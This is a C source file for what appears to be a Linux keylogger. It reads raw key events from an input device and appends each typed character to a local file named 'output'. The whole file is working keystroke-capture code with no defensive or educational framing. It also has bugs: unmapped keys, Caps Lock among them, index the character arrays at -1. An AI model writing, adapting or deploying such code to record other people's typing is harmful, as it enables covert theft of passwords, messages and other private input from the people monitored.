#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>

char reg_keys[49] = "1234567890-=qwertyuiop[]asdfghjkl;'`\\zxcvbnm,./<";
char shift_keys[49] = "!@#$%^&*()_+QWERTYUIOP{}ASDFGHJKL:\"~|ZXCVBNM<>?>";
char cap_keys[49] = "1234567890-=QWERTYUIOP[]ASDFGHJKL;'`\\ZXCVBNM,./<";
char capshift_keys[49] = "!@#$%^&*()_+qwertyuiop{}asdfghjkl:\"~|zxcvbnm<>?>";
static void sig_handler(int);

int convert(unsigned int keycode)
{
  if (keycode >= KEY_1 && keycode <= KEY_EQUAL)  // keycodes 2-13: US keyboard: 1, 2, ..., 0, -, =
    return keycode - 2;
  if (keycode >= KEY_Q && keycode <= KEY_RIGHTBRACE)  // keycodes 16-27: q, w, ..., [, ]
    return keycode - 4;
  if (keycode >= KEY_A && keycode <= KEY_GRAVE)  // keycodes 30-41: a, s, ..., ', `
    return keycode - 6;
  if (keycode >= KEY_BACKSLASH && keycode <= KEY_SLASH)  // keycodes 43-53: \, z, ..., ., /
    return keycode - 7;
  
  if (keycode == KEY_102ND) return 47;  // key right to the left of 'Z' on US layout

	switch (keycode) {
	case KEY_KP0:
		return 9;
	case KEY_KP3:
		return 2;
	case KEY_KP2:
		return 1;
	case KEY_KP1:
		return 0;
	case KEY_KP6:
		return 5;
	case KEY_KP5:
		return 4;
	case KEY_KP4:
		return 3;
	case KEY_KP9:
		return 8;
	case KEY_KP8:
		return 7;
	case KEY_KP7:
		return 6;
	default:
		return -1;
	}
}

static void sig_handler(int signo)
{
	exit(0);
}

int main(int argc, char **argv)
{
  int fd;
  FILE * output;
  
  fd = open(argv[1], O_RDONLY);
  output = fopen("output", "a");

  struct input_event ev;

  int k, old, new, count, shift, caps;
  old = 0;
  new = 0;
  count = 0;
	shift = 0;
	caps = 0;	
	
  while (1)
  {
    k = read(fd, &ev, sizeof(struct input_event));
    if (ev.type != 1)
			continue;		
	
		// key release
		if (ev.value == 0) {
			if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT)
				shift = !shift;
		}

		// ignore autorepeat
		if (ev.value != 1)
			continue;

		if (ev.code == KEY_SPACE) {
			fprintf(output, " ");
			continue;
		} 
		else if (ev.code == KEY_ENTER || ev.code == KEY_KPENTER) {
			fprintf(output, "\n");
			continue;
		}
	  else if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
      shift = !shift;
			continue;
		}
		else if (ev.code == KEY_CAPSLOCK) {
			caps = !caps;
		}

		if (shift && caps)
			new = capshift_keys[convert(ev.code)];	
		else if (caps)
			new = cap_keys[convert(ev.code)];
		else if (shift)
			new = shift_keys[convert(ev.code)];
		else
			new = reg_keys[convert(ev.code)];		

		putc(new, output);
		
		signal(SIGINT, sig_handler); 
  }

}


